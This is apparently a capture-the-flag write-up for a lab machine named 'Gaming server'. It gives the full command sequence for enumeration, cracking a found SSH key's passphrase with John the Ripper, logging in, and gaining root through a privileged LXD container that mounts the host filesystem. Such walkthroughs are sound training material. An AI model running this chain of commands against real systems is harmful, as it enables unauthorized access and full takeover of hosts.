# Gaming server

* Scan with nmap
```bash
$ nmap -p- -sV $IP
```
* We find the folder */uploads* containing a dictionary *dict.lst*
* Nikto and dirbuster find the */secret* folder, containing an *RSA private key*
* The HTML code has a comment referencing a user *john*
* The key has a password which we can bruteforce using
```bash
$ locate ssh2john.py
/usr/share/john/ssh2john.py
$ /usr/share/john/ssh2john.py rsa_pv_key > key4john
$ john key4john --wordlist=dict.lst
```
* The password is *letmein*, also present in *rockyou.txt*

```bash
$ ssh -i rsa_pv_key john@10.10.208.227
$ git clone  https://github.com/saghul/lxd-alpine-builder.git
$ cd lxd-alpine-builder
$ ./build-alpine

# Transfer the archive to the target with wget and python http server or scp
$ lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage
$ lxc image list
$ lxc init myimage ignite -c security.privileged=true
$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
$ lxc start ignite
$ lxc exec ignite /bin/sh
$ id
# then navigate to /mnt/root/root to get the flag
# if we wanted to really gain root, we could set another password to root in the /etc/passwd file
```

